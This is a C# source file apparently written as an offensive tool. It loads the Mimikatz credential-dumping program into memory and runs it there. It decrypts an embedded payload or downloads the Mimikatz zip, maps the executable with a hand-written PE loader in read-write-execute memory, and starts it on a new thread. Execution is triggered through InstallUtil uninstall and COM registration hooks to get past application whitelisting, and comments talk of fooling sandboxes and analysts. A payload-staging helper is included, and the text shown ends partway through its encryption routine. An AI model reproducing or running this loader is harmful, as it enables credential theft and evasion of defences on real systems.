using System;
using System.Collections.Generic;
using System.EnterpriseServices;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KatzAssembly
{

    public class Program
    {
        public static void Main()
        {
            Console.WriteLine("Hello From Main...I Don't Do Anything");
            //Add any behaviour here to throw off sandbox execution/analysts :)

            /*
             try
             {
                 Katz.Exec();
             }
             catch (SecurityException ex)
             {
                 Console.WriteLine(ex.Message);
                 Console.ReadLine();
             }
             */


            byte[] b = Misc.FileToByteArray(@"e:\Users\RODCHENKO\Documents\GitHub\mimikatz\mimikatz.zip");
            byte[] e = Misc.Encrypt(b, "[!~=passw0rd=~!]");
            string f = System.Convert.ToBase64String(e);
            File.WriteAllText(@"e:\temp\WB\mimikatz_trunk.zip.enc.b64", f);
            Console.ReadLine();
        }

    }

    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

        [ComRegisterFunction] //This executes if registration is successful
        public static void RegisterClass(string key)
        {
            try
            {
                Katz.ExecInternal();
            }
            catch (SecurityException ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }
        }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            try
            {
                Katz.ExecInternal();
            }
            catch (SecurityException ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }
        }
    }


    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {

            Console.WriteLine("Hello There From Uninstall");
            try
            {
                Katz.ExecInternal();
            }
            catch (SecurityException ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }

        }

    }

    public static class Katz
    {

        public static void ExecInternal()
        {
            Exec(false);
        }

        public static void Exec(bool UseNet)
        {
            byte[] unpacked = null;
            try
            {

                byte[] latestMimikatz;

                if (UseNet)
                {
                    //latestMimikatz = null;
                    ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls;
                    latestMimikatz = new System.Net.WebClient().DownloadData("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180616/mimikatz_trunk.zip");
                }
                else
                {

                    latestMimikatz = Misc.Decrypt(Convert.FromBase64String(Misc.newKatz()), "[!~=passw0rd=~!]"); //Yes, this is a bad idea. 
                                                                                                                 //Use Misc Class to encrypt your own files
                                                                                                                 //File.WriteAllBytes(@"c:\temp\WB\Katz.zip", latestMimikatz);
                                                                                                                 //byte[] latestMimikatz = File.ReadAllBytes(@"c:\temp\WB\mimikatz_trunk.zip");
                                                                                                                 //byte[] latestMimikatzenc = Misc.Encrypt(latestMimikatz, "password");
                                                                                                                 //string base64latestMimiEnc = Convert.ToBase64String(latestMimikatzenc);
                                                                                                                 //File.WriteAllText(@"c:\temp\WB\base64latestMimiEnc.txt", base64latestMimiEnc);
                                                                                                                 //File.WriteAllBytes(@"c:\temp\WB\latestMimiEnc.txt", latestMimikatzenc);
                }

                Stream data = new MemoryStream(latestMimikatz); //The original data
                Stream unzippedEntryStream;  //Unzipped data from a file in the archive
                ZipArchive archive = new ZipArchive(data);

                Console.WriteLine("archive unpacked");

                foreach (ZipArchiveEntry entry in archive.Entries)
                {
                    Console.WriteLine(entry.FullName);
                    if (IntPtr.Size == 8 && entry.FullName == @"x64/mimikatz.exe") //x64 Unpack And Execute
                    {
                        //x64 Unpack And Execute
                        Console.WriteLine(entry.FullName + " !! Gocha");
                        unzippedEntryStream = entry.Open(); // .Open will return a stream
                        unpacked = Misc.ReadFully(unzippedEntryStream);

                    }
                    else if (IntPtr.Size == 4 && entry.FullName == @"Win32/mimikatz.exe")
                    {
                        //x86 Unpack And Execute
                        Console.WriteLine(entry.FullName + " !! Gocha");
                        unzippedEntryStream = entry.Open(); // .Open will return a stream
                        unpacked = Misc.ReadFully(unzippedEntryStream);

                    }

                }

            }
            catch (Exception ex)
            {
                while (ex != null)
                {
                    Console.WriteLine(ex.Message);
                    ex = ex.InnerException;
                }
            }

            Console.WriteLine("Downloaded Latest");
            //Console.ReadLine();
            PELoader pe = new PELoader(unpacked);

            //MessageBox.Show("peloader");

            IntPtr codebase = IntPtr.Zero;

            if (pe.Is32BitHeader)
            {
                Console.WriteLine("Pref LA = {0}", pe.OptionalHeader32.ImageBase.ToString("X4"));
                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader32.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader32.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
            }
            else
            {
                Console.WriteLine("Pref LA = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
            }



            //Copy Sections
            for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
            {

                IntPtr y = NativeDeclarations.VirtualAlloc(IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
            }

            //Perform Base Relocation
            //Calculate Delta
            IntPtr currentbase = codebase;
            long delta;
            if (pe.Is32BitHeader)
            {

                delta = (int)(currentbase.ToInt32() - (int)pe.OptionalHeader32.ImageBase);
            }
            else
            {

                delta = (long)(currentbase.ToInt64() - (long)pe.OptionalHeader64.ImageBase);
            }

            Console.WriteLine("Delta = {0}", delta.ToString("X4"));

            //Modify Memory Based On Relocation Table
            IntPtr relocationTable;
            if (pe.Is32BitHeader)
            {
                relocationTable = (IntPtr.Add(codebase, (int)pe.OptionalHeader32.BaseRelocationTable.VirtualAddress));
            }
            else
            {
                relocationTable = (IntPtr.Add(codebase, (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));
            }


            NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
            relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

            int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
            IntPtr nextEntry = relocationTable;
            int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
            IntPtr offset = relocationTable;

            while (true)
            {

                NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                IntPtr x = IntPtr.Add(relocationTable, sizeofNextBlock);
                relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

                IntPtr dest = IntPtr.Add(codebase, (int)relocationEntry.VirtualAdress);

                for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                {

                    IntPtr patchAddr;
                    UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));

                    UInt16 type = (UInt16)(value >> 12);
                    UInt16 fixup = (UInt16)(value & 0xfff);

                    switch (type)
                    {
                        case 0x0:
                            break;
                        case 0x3:
                            patchAddr = IntPtr.Add(dest, fixup);
                            //Add Delta To Location.                            
                            int originalx86Addr = Marshal.ReadInt32(patchAddr);
                            Marshal.WriteInt32(patchAddr, originalx86Addr + (int)delta);
                            break;
                        case 0xA:
                            patchAddr = IntPtr.Add(dest, fixup);
                            //Add Delta To Location.
                            long originalAddr = Marshal.ReadInt64(patchAddr);
                            Marshal.WriteInt64(patchAddr, originalAddr + delta);
                            break;

                    }

                }

                offset = IntPtr.Add(relocationTable, sizeofNextBlock);
                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                relocationEntry = relocationNextEntry;

                nextEntry = IntPtr.Add(nextEntry, sizeofNextBlock);

                if (relocationNextEntry.SizeOfBlock == 0) break;


            }


            //Resolve Imports

            IntPtr z;
            IntPtr oa1;
            int oa2;

            if (pe.Is32BitHeader)
            {
                z = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
                oa1 = IntPtr.Add(codebase, (int)pe.OptionalHeader32.ImportTable.VirtualAddress);
                oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));
            }
            else
            {
                z = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
                oa1 = IntPtr.Add(codebase, (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));
            }



            //Get And Display Each DLL To Load

            IntPtr threadStart;
            IntPtr hThread;
            uint cthread = NativeDeclarations.GetCurrentThreadId();
            var t = Task.Run(() =>
            {
                if (pe.Is32BitHeader)
                {
                    int j = 0;
                    while (true) //HardCoded Number of DLL's Do this Dynamically.
                    {
                        IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)pe.OptionalHeader32.ImportTable.VirtualAddress);
                        int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                        IntPtr a2 = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2));
                        IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                        string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                        if (DllName == "") { break; }

                        IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                        Console.WriteLine("Loaded {0}", DllName);
                        int k = 0;
                        while (true)
                        {
                            IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, Marshal.ReadInt32(a2)));
                            string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                            IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                            Marshal.WriteInt32(a2, (int)funcAddy);
                            a2 = IntPtr.Add(a2, 4);
                            if (DllFuncName == "") break;
                            k++;
                        }
                        j++;
                    }
                    //Transfer Control To OEP
                    Console.WriteLine("Executing Mimikatz");
                    threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader32.AddressOfEntryPoint);
                    hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);

                    NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
                    

                    //NativeDeclarations.WaitForSingleObject(hThread, 0x0);
                    /*
                    IntPtr[] ptrs = new IntPtr[1];
                    ptrs[0] = hThread;
                    NativeDeclarations.MsgWaitForMultipleObjectsEx(1,ptrs,0xFFFFFFFF, 0x04FF, 0x0001);
                    uint exitCode = 259;
                    while (exitCode == 259) 
                    {
                        System.Threading.Thread.Sleep(1000);
                        NativeDeclarations.GetExitCodeThread(hThread, out exitCode);
                    }
                    */

                    //Console.WriteLine("Thread Complete");
                }
                else
                {
                    int j = 0;
                    while (true)
                    {
                        IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                        int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                        IntPtr a2 = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)); //Need just last part? 
                        IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                        string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                        if (DllName == "") { break; }

                        IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                        Console.WriteLine("Loaded {0}", DllName);
                        int k = 0;
                        while (true)
                        {
                            IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, Marshal.ReadInt32(a2)));
                            string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                            //Console.WriteLine("Function {0}", DllFuncName);
                            IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                            Marshal.WriteInt64(a2, (long)funcAddy);
                            a2 = IntPtr.Add(a2, 8);
                            if (DllFuncName == "") break;
                            k++;
                        }
                        j++;
                    }
                    //Transfer Control To OEP
                    Console.WriteLine("Executing Mimikatz");
                    threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
                    hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                    NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);

                    //Console.WriteLine("Thread Complete");
                }
            });
            t.Wait();
            //Transfer Control To OEP
            t.Dispose();
            Console.WriteLine("Thread Complete");
            Console.ReadLine();

            NativeDeclarations.VirtualFree(codebase, 0, NativeDeclarations.FreeType.Release);

            //unpacked = unpacked.Select(n => Convert.ToByte(0)).ToArray();
            //Byte[] array = new Byte[pe.RawBytes.Length];
            //Array.Clear(array, 0, array.Length);
            //Marshal.Copy(array, 0, codebase, array.Length);
            
            //pe = null;
            //GC.Collect();
            //GC.WaitForFullGCComplete();
            Console.WriteLine("Free memory");
            Console.ReadLine();

        } //End Main



    }//End Program

    public class PELoader
    {
        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {

            Stub = 0x00000000,

        }


        /// The DOS header

        private IMAGE_DOS_HEADER dosHeader;

        /// The file header

        private IMAGE_FILE_HEADER fileHeader;

        /// Optional 32 bit file header 

        private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

        /// Optional 64 bit file header 

        private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

        /// Image Section headers. Number of sections is in the file header.

        private IMAGE_SECTION_HEADER[] imageSectionHeaders;

        public PELoader(string filePath)
        {
            // Read in the DLL or EXE and get the timestamp
            using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }

                RawBytes = System.IO.File.ReadAllBytes(filePath);

            }
        }

        public PELoader(byte[] fileBytes)
        {
            // Read in the DLL or EXE and get the timestamp
            using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }


                RawBytes = fileBytes;

            }
        }


        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }



        public bool Is32BitHeader
        {
            get
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }


        public IMAGE_FILE_HEADER FileHeader
        {
            get
            {
                return fileHeader;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
        {
            get
            {
                return optionalHeader32;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
        {
            get
            {
                return optionalHeader64;
            }
        }

        public IMAGE_SECTION_HEADER[] ImageSectionHeaders
        {
            get
            {
                return imageSectionHeaders;
            }
        }

        public byte[] RawBytes { get; }

    }//End Class

    [SuppressUnmanagedCodeSecurityAttribute]
    unsafe class NativeDeclarations
    {
        
        #region pinvoke flags
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [Flags]
        public enum FreeType
        {
            Decommit = 0x4000,
            Release = 0x8000,
        }
        #endregion
        #region pinvoke structs
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }
        #endregion
        

        public static uint MEM_COMMIT = 0x1000;
        public static uint MEM_RESERVE = 0x2000;
        public static uint PAGE_EXECUTE_READWRITE = 0x40;
        public static uint PAGE_READWRITE = 0x04;

        [StructLayout(LayoutKind.Sequential)]
        public /*unsafe*/ struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [DllImport("kernel32.dll")]
        public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);

        [DllImport("kernel32.dll")]
        public static extern uint GetCurrentThreadId();

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
        public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);

        [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, int dwSize, FreeType dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(

          IntPtr lpThreadAttributes,
          uint dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          uint dwCreationFlags,
          IntPtr lpThreadId
          );

        [DllImport("user32")]
        public static extern uint MsgWaitForMultipleObjectsEx(uint nCount, IntPtr[] pHandles, uint dwMilliseconds, uint dwWakeMask, uint dwFlags);

        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );

        [StructLayout(LayoutKind.Sequential)]
        public /*unsafe*/ struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }


    }

    public class Misc
    {
        //Change This!
        private static readonly byte[] SALT = new byte[] { 0xcd, 0x2f, 0x56, 0x47, 0xeb, 0xc1, 0x29, 0xc6, 0x16, 0x3d, 0x35, 0xdd, 0x7b, 0x60, 0x0e, 0xaf };


        public static void Stage(string fileName, string Key, string outFile)
        {

            byte[] raw = FileToByteArray(fileName);
            byte[] file = Encrypt(raw, Key);

            FileStream fileStream = File.Create(outFile);

            fileStream.Write(file, 0, file.Length);//Write stream to temp file

            Console.WriteLine("File Ready, Now Deliver Payload");

        }

        public static byte[] FileToByteArray(string _FileName)
        {
            byte[] _Buffer = null;
            System.IO.FileStream _FileStream = new System.IO.FileStream(_FileName, System.IO.FileMode.Open, System.IO.FileAccess.Read);
            System.IO.BinaryReader _BinaryReader = new System.IO.BinaryReader(_FileStream);
            long _TotalBytes = new System.IO.FileInfo(_FileName).Length;
            _Buffer = _BinaryReader.ReadBytes((Int32)_TotalBytes);
            _FileStream.Close();
            _FileStream.Dispose();
            _BinaryReader.Close();
            return _Buffer;
        }

        public static byte[] Encrypt(byte[] plain, string password)
        {
            MemoryStream memoryStream;
            CryptoStream cryptoStream;
